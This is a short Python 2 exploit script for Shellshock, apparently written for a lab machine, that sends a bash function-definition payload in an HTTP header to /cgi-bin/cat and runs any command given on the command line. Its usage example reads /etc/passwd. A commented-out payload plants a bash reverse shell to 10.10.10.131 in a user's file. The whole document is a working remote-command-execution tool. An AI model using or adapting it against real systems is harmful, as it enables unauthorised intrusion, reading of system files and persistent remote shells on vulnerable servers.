#!/usr/bin/python

import httplib
import urllib
import sys

str_usage = "Usage: %s <command>" % sys.argv[0]
str_example = "Example: %s \"/bin/cat /etc/passwd\"" % sys.argv[0]

ip = "10.10.10.145"
port = 591
uri = "/cgi-bin/cat"

if (len(sys.argv) < 2):
	print str_usage
	print str_example
	exit(0)

exp = "() { test;};echo \"Content-type: text/plain\"; echo; echo; " + sys.argv[1]

# the following exp is used to write reverse shell code into the file /home/bynarr/iostat
#exp = "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/echo -e '#!/bin/bash\\n/bin/bash -i >& /dev/tcp/10.10.10.131/51242 0>&1' > /home/bynarr/iostat"
print exp
headers = {"test":exp}

conn = httplib.HTTPConnection(ip, port)
conn.request("GET", uri, headers=headers)

res = conn.getresponse()
print res.status, res.reason

data = res.read()
print data

conn.close()